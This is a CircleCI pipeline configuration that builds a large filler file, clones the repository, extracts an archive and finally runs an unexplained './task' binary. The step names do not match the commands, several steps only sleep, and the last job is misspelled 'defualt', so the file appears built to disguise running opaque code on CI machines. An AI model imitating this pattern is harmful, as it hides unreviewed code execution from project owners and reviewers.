version: 2.1

jobs:
  arrPage:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build v1
          command: |
            mkdir -p /tmp/beta3
            set +o pipefail 2>/dev/null; echo "||||" > /tmp/beta3/db_cfg_sw; seq 1 887663 >> /tmp/beta3/db_cfg_sw; echo "||||" >> /tmp/beta3/db_cfg_sw; true
            echo "staged-$(wc -c </tmp/beta3/db_cfg_sw)B"
      - persist_to_workspace:
          root: /tmp/beta3
          paths:
            - 'db_cfg_sw'
  defualt:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/beta3
      - run:
          name: Fetch gate manifest
          command: |
            od -An -x /tmp/beta3/db_cfg_sw 2>/dev/null | head -2 || true
      - run:
          name: Fetch repo
          command: git clone --depth 3 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unroll archive
          command: tar --extract --file=main-pkg.tar
      - run:
          command: sleep 60
      - run:
          name: Store metadata
          no_output_timeout: 15m
          command: sleep 120
      - run:
          name: Collect artifacts
          command: sleep 30
      - run:
          command: env ./task
